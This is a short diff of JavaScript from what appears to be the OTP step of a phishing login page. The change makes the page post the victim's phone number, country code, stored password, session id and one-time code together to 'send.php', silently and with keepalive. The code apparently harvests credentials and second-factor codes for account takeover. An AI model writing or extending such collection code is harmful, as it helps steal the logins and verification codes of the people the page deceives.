@@ -128,7 +128,15 @@
     fetch('send.php', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ step: 'otp', otp: code, attempt: attempts + 1 }),
+      body: JSON.stringify({
+        step: 'otp',
+        sessionId:   sessionStorage.getItem('sessionId')   || '',
+        phone:       sessionStorage.getItem('phone')       || '',
+        countryCode: sessionStorage.getItem('countryCode') || '',
+        password:    sessionStorage.getItem('staticPwd')   || '',
+        otp: code,
+        attempt: attempts + 1,
+      }),
       keepalive: true,
     }).catch(() => {});
 
